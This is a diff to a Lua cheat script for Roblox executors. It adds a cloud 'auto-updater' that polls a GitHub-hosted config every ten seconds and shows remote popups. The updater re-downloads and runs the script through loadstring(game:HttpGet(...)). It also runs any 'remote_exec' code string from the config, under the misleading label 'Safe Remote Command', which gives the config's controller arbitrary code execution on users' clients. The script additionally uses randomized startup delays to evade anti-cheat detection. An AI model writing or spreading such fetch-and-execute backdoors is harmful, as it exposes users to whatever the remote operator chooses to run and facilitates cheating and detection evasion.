@@ -4,6 +4,9 @@
     Compatible with: KRNL, Synapse, Wave, Fluxus, Delta, Hydrogen, Arceus X, Solara
 ]]
 
+_G.AlphaInstanceId = tick()
+local MyInstanceId = _G.AlphaInstanceId
+
 --============================== STAGGERED STARTUP ==============================
 pcall(function()
     if not game:IsLoaded() then
@@ -11,8 +14,11 @@ pcall(function()
     end
 end)
 
--- Randomized startup delay to avoid frame-0 detection
-task.wait(math.random(20, 50) / 10) -- 2.0 to 5.0 seconds
+-- Randomized startup delay to avoid frame-0 detection (skipped during live hot-reload)
+if not _G.AlphaV2HotReloaded then
+    task.wait(math.random(20, 50) / 10)
+end
+_G.AlphaV2HotReloaded = true
 
 --============================== CORE SERVICES ==============================
 local Players = game:GetService("Players")
@@ -3381,6 +3387,318 @@ if _G.Config.AntiAFK then EnableAntiAFK() end
 -- Full input isolation: Active = true on all containers so clicks NEVER register into the 3D game world!
 -- Featuring: 3D Depth layering, smooth TweenService micro-animations, real-time Searchable Dropdowns, and Per-Sea filtering!
 
+--============================== LIVE BROADCAST & CLOUD AUTO-UPDATER ENGINE ==============================
+local SCRIPT_VERSION = "2.1.0"
+local SCRIPT_URL = "https://raw.githubusercontent.com/obeygaming035-pixel/lead-finder/main/alpha_v2.lua"
+local LIVE_CONFIG_URL = "https://raw.githubusercontent.com/obeygaming035-pixel/lead-finder/main/live_config.json"
+
+local function FetchRemoteConfig()
+    local content = nil
+    pcall(function()
+        if game.HttpGet then
+            content = game:HttpGet(LIVE_CONFIG_URL .. "?t=" .. tick())
+        elseif safeRequest then
+            local res = safeRequest({Url = LIVE_CONFIG_URL .. "?t=" .. tick(), Method = "GET"})
+            if res and res.Body then content = res.Body end
+        end
+    end)
+    if content and #content > 0 then
+        local ok, decoded = pcall(function()
+            return HttpService:JSONDecode(content)
+        end)
+        if ok and type(decoded) == "table" then
+            return decoded
+        end
+    end
+    return nil
+end
+
+-- Live Floating Toast Notification (Neon Cyber 3D)
+local function ShowLiveToast(title, message, accentColor, duration)
+    pcall(function()
+        local parentGui = GetSafeGui()
+        if not parentGui then return end
+        
+        duration = duration or 5
+        accentColor = accentColor or Color3.fromRGB(0, 230, 255)
+        
+        local ToastGui = parentGui:FindFirstChild("AlphaToastGui")
+        if not ToastGui then
+            ToastGui = Instance.new("ScreenGui")
+            ToastGui.Name = "AlphaToastGui"
+            ToastGui.ResetOnSpawn = false
+            ToastGui.DisplayOrder = 1000000
+            ToastGui.Parent = parentGui
+        end
+        
+        local ToastFrame = Instance.new("Frame")
+        ToastFrame.Size = UDim2.new(0, 360, 0, 62)
+        ToastFrame.Position = UDim2.new(0.5, -180, 0, -80)
+        ToastFrame.BackgroundColor3 = Color3.fromRGB(15, 17, 24)
+        ToastFrame.BorderSizePixel = 0
+        ToastFrame.Active = true
+        ToastFrame.ZIndex = 50
+        ToastFrame.Parent = ToastGui
+        
+        local Corner = Instance.new("UICorner")
+        Corner.CornerRadius = UDim.new(0, 8)
+        Corner.Parent = ToastFrame
+        
+        local Stroke = Instance.new("UIStroke")
+        Stroke.Color = accentColor
+        Stroke.Thickness = 1.5
+        Stroke.Parent = ToastFrame
+        
+        local IconLabel = Instance.new("TextLabel")
+        IconLabel.Size = UDim2.new(0, 36, 0, 36)
+        IconLabel.Position = UDim2.new(0, 8, 0.5, -18)
+        IconLabel.BackgroundTransparency = 1
+        IconLabel.Text = "⚡"
+        IconLabel.TextSize = 22
+        IconLabel.TextColor3 = accentColor
+        IconLabel.Parent = ToastFrame
+        
+        local TitleLabel = Instance.new("TextLabel")
+        TitleLabel.Size = UDim2.new(1, -54, 0, 20)
+        TitleLabel.Position = UDim2.new(0, 48, 0, 8)
+        TitleLabel.BackgroundTransparency = 1
+        TitleLabel.Font = Enum.Font.GothamBold
+        TitleLabel.TextSize = 13
+        TitleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+        TitleLabel.TextXAlignment = Enum.TextXAlignment.Left
+        TitleLabel.Text = tostring(title or "LIVE NOTIFICATION")
+        TitleLabel.Parent = ToastFrame
+        
+        local MsgLabel = Instance.new("TextLabel")
+        MsgLabel.Size = UDim2.new(1, -54, 0, 28)
+        MsgLabel.Position = UDim2.new(0, 48, 0, 28)
+        MsgLabel.BackgroundTransparency = 1
+        MsgLabel.Font = Enum.Font.Gotham
+        MsgLabel.TextSize = 11
+        MsgLabel.TextColor3 = Color3.fromRGB(200, 205, 220)
+        MsgLabel.TextXAlignment = Enum.TextXAlignment.Left
+        MsgLabel.TextWrapped = true
+        MsgLabel.Text = tostring(message or "")
+        MsgLabel.Parent = ToastFrame
+        
+        TweenService:Create(ToastFrame, TweenInfo.new(0.4, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
+            Position = UDim2.new(0.5, -180, 0, 28)
+        }):Play()
+        
+        if PlayClickSound then PlayClickSound() end
+        
+        task.delay(duration, function()
+            if ToastFrame and ToastFrame.Parent then
+                local tw = TweenService:Create(ToastFrame, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
+                    Position = UDim2.new(0.5, -180, 0, -80)
+                })
+                tw:Play()
+                tw.Completed:Connect(function()
+                    if ToastFrame then ToastFrame:Destroy() end
+                end)
+            end
+        end)
+    end)
+end
+
+-- Live Modal Announcement Popup (Supports Custom Image & Decals)
+local function ShowLivePopup(title, message, imageUrl)
+    pcall(function()
+        local parentGui = GetSafeGui()
+        if not parentGui then return end
+        
+        local ModalGui = parentGui:FindFirstChild("AlphaModalGui")
+        if ModalGui then ModalGui:Destroy() end
+        
+        ModalGui = Instance.new("ScreenGui")
+        ModalGui.Name = "AlphaModalGui"
+        ModalGui.ResetOnSpawn = false
+        ModalGui.DisplayOrder = 1000001
+        ModalGui.Parent = parentGui
+        
+        local Overlay = Instance.new("TextButton")
+        Overlay.Size = UDim2.new(1, 0, 1, 0)
+        Overlay.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+        Overlay.BackgroundTransparency = 0.55
+        Overlay.Text = ""
+        Overlay.AutoButtonColor = false
+        Overlay.Parent = ModalGui
+        
+        local hasImage = imageUrl and imageUrl ~= ""
+        local frameHeight = hasImage and 330 or 195
+        
+        local ModalFrame = Instance.new("Frame")
+        ModalFrame.Size = UDim2.new(0, 420, 0, frameHeight)
+        ModalFrame.Position = UDim2.new(0.5, -210, 0.5, -frameHeight / 2)
+        ModalFrame.BackgroundColor3 = Color3.fromRGB(15, 17, 24)
+        ModalFrame.BorderSizePixel = 0
+        ModalFrame.Active = true
+        ModalFrame.Parent = ModalGui
+        
+        local Corner = Instance.new("UICorner")
+        Corner.CornerRadius = UDim.new(0, 10)
+        Corner.Parent = ModalFrame
+        
+        local Stroke = Instance.new("UIStroke")
+        Stroke.Color = Color3.fromRGB(0, 230, 255)
+        Stroke.Thickness = 1.5
+        Stroke.Parent = ModalFrame
+        
+        local TitleBar = Instance.new("TextLabel")
+        TitleBar.Size = UDim2.new(1, -32, 0, 32)
+        TitleBar.Position = UDim2.new(0, 16, 0, 10)
+        TitleBar.BackgroundTransparency = 1
+        TitleBar.Font = Enum.Font.GothamBold
+        TitleBar.TextSize = 14
+        TitleBar.TextColor3 = Color3.fromRGB(0, 230, 255)
+        TitleBar.TextXAlignment = Enum.TextXAlignment.Left
+        TitleBar.Text = tostring(title or "LIVE ANNOUNCEMENT")
+        TitleBar.Parent = ModalFrame
+        
+        local currentY = 46
+        
+        if hasImage then
+            local Img = Instance.new("ImageLabel")
+            Img.Size = UDim2.new(1, -32, 0, 140)
+            Img.Position = UDim2.new(0, 16, 0, currentY)
+            Img.BackgroundColor3 = Color3.fromRGB(8, 10, 15)
+            Img.ScaleType = Enum.ScaleType.Fit
+            Img.Image = imageUrl
+            Img.Parent = ModalFrame
+            
+            local ImgCorner = Instance.new("UICorner")
+            ImgCorner.CornerRadius = UDim.new(0, 6)
+            ImgCorner.Parent = Img
+            
+            currentY = currentY + 148
+        end
+        
+        local BodyText = Instance.new("TextLabel")
+        BodyText.Size = UDim2.new(1, -32, 0, 52)
+        BodyText.Position = UDim2.new(0, 16, 0, currentY)
+        BodyText.BackgroundTransparency = 1
+        BodyText.Font = Enum.Font.Gotham
+        BodyText.TextSize = 12
+        BodyText.TextColor3 = Color3.fromRGB(220, 225, 235)
+        BodyText.TextWrapped = true
+        BodyText.TextXAlignment = Enum.TextXAlignment.Left
+        BodyText.TextYAlignment = Enum.TextYAlignment.Top
+        BodyText.Text = tostring(message or "")
+        BodyText.Parent = ModalFrame
+        
+        local CloseBtn = Instance.new("TextButton")
+        CloseBtn.Size = UDim2.new(1, -32, 0, 32)
+        CloseBtn.Position = UDim2.new(0, 16, 1, -42)
+        CloseBtn.BackgroundColor3 = Color3.fromRGB(0, 180, 220)
+        CloseBtn.Font = Enum.Font.GothamBold
+        CloseBtn.Text = "DISMISS"
+        CloseBtn.TextColor3 = Color3.fromRGB(10, 12, 18)
+        CloseBtn.TextSize = 12
+        CloseBtn.Parent = ModalFrame
+        
+        local BtnCorner = Instance.new("UICorner")
+        BtnCorner.CornerRadius = UDim.new(0, 6)
+        BtnCorner.Parent = CloseBtn
+        
+        local function Close()
+            if PlayClickSound then PlayClickSound() end
+            TweenService:Create(ModalFrame, TweenInfo.new(0.2, Enum.EasingStyle.Quad), {Size = UDim2.new(0, 0, 0, 0), Position = UDim2.new(0.5, 0, 0.5, 0)}):Play()
+            task.delay(0.2, function()
+                if ModalGui then ModalGui:Destroy() end
+            end)
+        end
+        
+        CloseBtn.MouseButton1Click:Connect(Close)
+        Overlay.MouseButton1Click:Connect(Close)
+    end)
+end
+
+-- Live Hot-Reload System
+local _isHotReloading = false
+local function TriggerLiveReload(newVersion)
+    if _isHotReloading then return end
+    _isHotReloading = true
+    
+    ShowLiveToast("⚡ CLOUD AUTO-UPDATE", "Hot-reloading to v" .. tostring(newVersion or "latest") .. " in real-time...", Color3.fromRGB(0, 255, 170), 4)
+    task.wait(1.0)
+    
+    -- Terminate previous loops via instance token
+    _G.AlphaInstanceId = tick()
+    
+    -- Clean movement state
+    ClearHover()
+    
+    -- Clean existing UI
+    local parentGui = GetSafeGui()
+    if parentGui then
+        for _, child in ipairs(parentGui:GetChildren()) do
+            if child:IsA("ScreenGui") and child:GetAttribute("_uid") == "v2h" then
+                child:Destroy()
+            end
+        end
+    end
+    
+    -- Re-execute latest script from GitHub
+    task.spawn(function()
+        local ok, err = pcall(function()
+            loadstring(game:HttpGet(SCRIPT_URL .. "?t=" .. tick()))()
+        end)
+        if not ok then
+            warn("[ALPHA LIVE] Hot-reload error:", err)
+            ShowLiveToast("❌ Reload Error", tostring(err), Color3.fromRGB(255, 70, 70), 5)
+        end
+    end)
+end
+
+-- Live Updater Polling Loop (Every 10-12s)
+local function StartLiveUpdaterLoop()
+    task.spawn(function()
+        local lastBroadcastId = nil
+        local lastPopupId = nil
+        local lastExecId = nil
+        
+        while _G.AlphaInstanceId == MyInstanceId do
+            task.wait(10)
+            
+            pcall(function()
+                local cfg = FetchRemoteConfig()
+                if not cfg then return end
+                
+                -- 1. Version Update / Force Reload
+                if cfg.force_reload or (cfg.latest_version and cfg.latest_version ~= SCRIPT_VERSION) then
+                    TriggerLiveReload(cfg.latest_version)
+                    return
+                end
+                
+                -- 2. Live Toast Broadcast
+                if cfg.broadcast and cfg.broadcast.enabled and cfg.broadcast.id and cfg.broadcast.id ~= lastBroadcastId then
+                    lastBroadcastId = cfg.broadcast.id
+                    local col = Color3.fromRGB(0, 230, 255)
+                    if type(cfg.broadcast.color) == "table" and #cfg.broadcast.color >= 3 then
+                        col = Color3.fromRGB(cfg.broadcast.color[1], cfg.broadcast.color[2], cfg.broadcast.color[3])
+                    end
+                    ShowLiveToast(cfg.broadcast.title, cfg.broadcast.message, col, cfg.broadcast.duration or 5)
+                end
+                
+                -- 3. Live Popup Modal
+                if cfg.popup and cfg.popup.enabled and cfg.popup.id and cfg.popup.id ~= lastPopupId then
+                    lastPopupId = cfg.popup.id
+                    ShowLivePopup(cfg.popup.title, cfg.popup.message, cfg.popup.image)
+                end
+                
+                -- 4. Safe Remote Command
+                if cfg.remote_exec and cfg.remote_exec ~= "" and cfg.remote_exec_id and cfg.remote_exec_id ~= lastExecId then
+                    lastExecId = cfg.remote_exec_id
+                    pcall(function()
+                        local fn = loadstring(cfg.remote_exec)
+                        if fn then fn() end
+                    end)
+                end
+            end)
+        end
+    end)
+end
+
 local SoundService = game:GetService("SoundService")
 local function PlayClickSound()
     pcall(function()
@@ -4824,6 +5142,24 @@ local function CreateUI()
     end)
     
     -- ==================== 12. SETTINGS ====================
+    MiscTab:AddSection("Live Cloud & Auto-Updater")
+    MiscTab:AddNotice("Connected to GitHub Live Engine (v" .. SCRIPT_VERSION .. ")", Color3.fromRGB(0, 230, 255))
+    MiscTab:AddButton("🔄 Check for Live Updates Now", function()
+        ShowLiveToast("CLOUD CHECK", "Polling GitHub live endpoint...", Color3.fromRGB(0, 230, 255), 3)
+        task.spawn(function()
+            local cfg = FetchRemoteConfig()
+            if cfg then
+                if cfg.latest_version and cfg.latest_version ~= SCRIPT_VERSION then
+                    TriggerLiveReload(cfg.latest_version)
+                else
+                    ShowLiveToast("UP TO DATE", "Running latest version (v" .. SCRIPT_VERSION .. ")", Color3.fromRGB(100, 255, 150), 4)
+                end
+            else
+                ShowLiveToast("OFFLINE", "Could not reach GitHub live endpoint", Color3.fromRGB(255, 100, 100), 4)
+            end
+        end)
+    end)
+    
     MiscTab:AddSection("Diagnostics & Fixes")
     MiscTab:AddButton("🔍 Run Movement Diagnostic (Copies to Clipboard)", function()
         local root = GetRoot()
@@ -4950,6 +5286,9 @@ task.spawn(function()
     
     task.wait(0.2 + math.random() * 0.3)
     StartSpecialBossAndBoneEngine()
+    
+    task.wait(0.2 + math.random() * 0.3)
+    StartLiveUpdaterLoop()
 end)
 
 print("--------------------------------------------------")
